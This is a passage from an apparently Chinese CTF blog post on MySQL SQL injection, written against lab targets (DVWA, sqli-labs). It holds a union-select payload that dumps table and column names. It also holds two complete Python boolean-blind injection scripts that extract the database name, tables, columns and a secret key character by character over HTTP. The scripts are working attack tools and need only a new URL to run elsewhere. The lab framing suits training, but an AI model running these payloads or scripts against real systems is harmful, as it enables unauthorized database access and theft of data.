class="hljs-operator">&amp;</span>Submit<span class="hljs-operator">=</span>Submit<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/image-20210130202412762.png" alt="image-20210130202412762"></p><ul><li>dvwa high</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-title">@p</span>) from (<span class="hljs-keyword">select</span>(<span class="hljs-title">@p</span>:<span class="hljs-operator">=</span><span class="hljs-number">0x00</span>)<span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span> (<span class="hljs-title">@p</span>) from (information_schema.columns) where (table_schema&gt;<span class="hljs-operator">=</span><span class="hljs-title">@p</span>) <span class="hljs-keyword">and</span> (<span class="hljs-title">@p</span>)in (<span class="hljs-title">@p</span>:<span class="hljs-operator">=</span>concat(<span class="hljs-title">@p</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x0D</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x0A</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x5b</span><span class="hljs-punctuation">,</span>table_schema<span class="hljs-punctuation">,</span><span class="hljs-number">0x5d</span><span class="hljs-punctuation">,</span><span class="hljs-number">0x3e</span><span class="hljs-punctuation">,</span>table_name<span class="hljs-punctuation">,</span><span class="hljs-number">0x3e</span><span class="hljs-punctuation">,</span>column_name<span class="hljs-punctuation">,</span><span class="hljs-number">0x7C</span>))))a))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/image-20210130203457790.png" alt="image-20210130203457790"></p><h3 id="select-回显数据"><a href="#select-回显数据" class="headerlink" title="select 回显数据"></a>select 回显数据</h3><p>最最基础的select回显数据，也分享一波</p><h3 id="Column-Num"><a href="#Column-Num" class="headerlink" title="Column Num"></a>Column Num</h3><p>获取columnNum的payload</p><h3 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h3><p>这里分享个布尔盲注的脚本</p><h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BoolSqlier</span>:<br>    url = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,database=<span class="hljs-string">&quot;&quot;</span></span>):<br>        self.database = database<br>        self.url = BoolSqlier.url<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">i,mid</span>):<br><br>            payload = <span class="hljs-string">&quot;1&#x27;and(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>            resp = requests.get(self.url,params=params)<br>            <span class="hljs-keyword">return</span> resp<br>            <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">database_i_ascii_bt_mid</span>(<span class="hljs-params">resp</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        database=<span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>            <span class="hljs-comment">#head 和 tail 决定了database的字符的取值范围</span><br>            head=<span class="hljs-number">32</span>         <br>            tail=<span class="hljs-number">127</span><br>            <span class="hljs-keyword">while</span> head&lt;tail:<br>                mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>                resp = send_request(i,mid)<br>               <br>                <span class="hljs-keyword">if</span> database_i_ascii_bt_mid(resp):<br>                    head=mid+<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    tail=mid<br>            <span class="hljs-keyword">if</span>(head!=<span class="hljs-number">32</span>):<br>                database+=<span class="hljs-built_in">chr</span>(head)<br>                <span class="hljs-built_in">print</span>(database)<br>        self.database = database<br>        <span class="hljs-built_in">print</span>(database)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    BoolSqlier.url = <span class="hljs-string">&quot;http://localhost:12345/Less-5/&quot;</span><br>    sqli = BoolSqlier()<br>    sqli.get_database()<br></code></pre></td></tr></table></figure><h4 id="面向过程"><a href="#面向过程" class="headerlink" title="面向过程"></a>面向过程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>session = requests.session()<br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-65/&quot;</span><br>what_i_want = <span class="hljs-string">&quot;&quot;</span><br>table_name = <span class="hljs-string">&quot;&quot;</span><br>column_name = <span class="hljs-string">&quot;&quot;</span><br>key = <span class="hljs-string">&quot;&quot;</span><br>count = <span class="hljs-number">0</span><br>text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1\&quot;) and ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;table_name&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    table_name+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(table_name)<br>    count = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is Your Loved table_name!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(table_name)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1\&quot;) and ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(table_name,i,mid)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;column_name&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    column_name+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(column_name)<br>    count = <span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> re<br>pattern = <span class="hljs-string">&quot;secret_....&quot;</span><br>column_name = re.findall(pattern,column_name)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is Your Loved column_name!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(column_name)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">what_i_want_i_less_than_or_equal_mid</span>(<span class="hljs-params">mid</span>):<br>        <span class="hljs-keyword">global</span> count<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;on the &#123;&#125;th request now.... &quot;</span>.<span class="hljs-built_in">format</span>(count))<br>        payload = <span class="hljs-string">&quot;1\&quot;) and ascii(mid((select group_concat(&#123;&#125;) from challenges.&#123;&#125;),&#123;&#125;,1))&lt;=&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(column_name,table_name,i,mid)<br>        <span class="hljs-built_in">print</span>(payload)<br>        params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        resp = session.get(url=url,params=params)<br>        <span class="hljs-comment">#print(resp.text)</span><br>        <span class="hljs-comment"># if mid==79:</span><br>        <span class="hljs-comment">#     print(resp.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Angelina&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--&quot;</span>*<span class="hljs-number">70</span>,<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing the &#123;&#125;th char now.... &quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low + high)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> what_i_want_i_less_than_or_equal_mid(mid):<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;th request completed!!!&quot;</span>.<span class="hljs-built_in">format</span>(count))<br>    <br>    <span class="hljs-keyword">if</span> low==<span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">break</span><br>    key+=<span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(key)<br>    count = <span class="hljs-number">0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!&quot;</span>*<span class="hljs-number">70</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This is your loved key!!!!!!!!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(key)<br></code></pre></td></tr></table></figure><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><ul><li><p>MYSQL注入天书</p><p><a href="https://github.com/lcamry/sqli-labs">https://github.com/lcamry/sqli-labs</a></p></li><li><p>PayloadsAllTheThings</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md</a></p></li></ul><blockquote><p> 好了，完结撒花</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqli</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
